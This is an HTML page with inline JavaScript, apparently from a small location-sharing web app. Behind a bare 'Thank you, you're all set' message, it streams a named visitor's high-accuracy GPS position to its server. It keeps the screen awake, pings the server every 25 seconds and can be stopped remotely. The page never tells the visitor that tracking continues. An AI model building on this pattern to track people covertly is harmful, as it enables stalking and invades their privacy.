<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Location Sharing</title>
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:'DM Sans',sans-serif; background:#0c1221; color:#e2e8f0; height:100vh; display:flex; align-items:center; justify-content:center; }
    .msg { text-align:center; padding:32px; }
    .msg h1 { font-size:32px; font-weight:600; margin-bottom:8px; }
    .msg p { font-size:16px; color:#94a3b8; }
    .hint { font-size:13px; color:#475569; margin-top:20px; display:none; }
  </style>
</head>
<body>
  <div class="msg">
    <h1>Thank you</h1>
    <p>You're all set.</p>
    <div class="hint" id="hint">To share your location, please allow access in your browser settings</div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const raw = decodeURIComponent(window.location.pathname.split('/')[2] || '');
    const userName = raw.charAt(0).toUpperCase() + raw.slice(1);
    const userId = raw.toLowerCase().replace(/\s+/g, '-');
    document.title = userName || 'Location Sharing';

    const socket = io();
    let watchId = null, wakeLock = null, denied = false;

    socket.on('connect', () => { if (!watchId && !denied) startGPS(); });

    function startGPS() {
      if (!navigator.geolocation) return;
      watchId = navigator.geolocation.watchPosition(
        pos => socket.emit('location-update', { userId, name: userName, lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
        err => { if (err.code === 1) { denied = true; document.getElementById('hint').style.display = 'block'; } },
        { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
      );
      try { navigator.wakeLock?.request('screen').then(l => { wakeLock = l; }); } catch(e) {}
    }

    socket.on('force-stop', (targetId) => {
      if (targetId === userId) {
        if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
        if (wakeLock) { try { wakeLock.release(); } catch(e) {} wakeLock = null; }
        socket.emit('user-offline', userId);
        socket.disconnect();
      }
    });

    setInterval(() => { if (socket.connected) socket.emit('ping-alive'); }, 25000);
    document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible' && !wakeLock) try { navigator.wakeLock?.request('screen').then(l => { wakeLock = l; }); } catch(e) {} });
    window.addEventListener('beforeunload', () => { if (socket.connected) socket.emit('user-offline', userId); });
    window.addEventListener('pagehide', () => { if (socket.connected) socket.emit('user-offline', userId); });
    if ('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js').catch(() => {});
  </script>
</body>
</html>
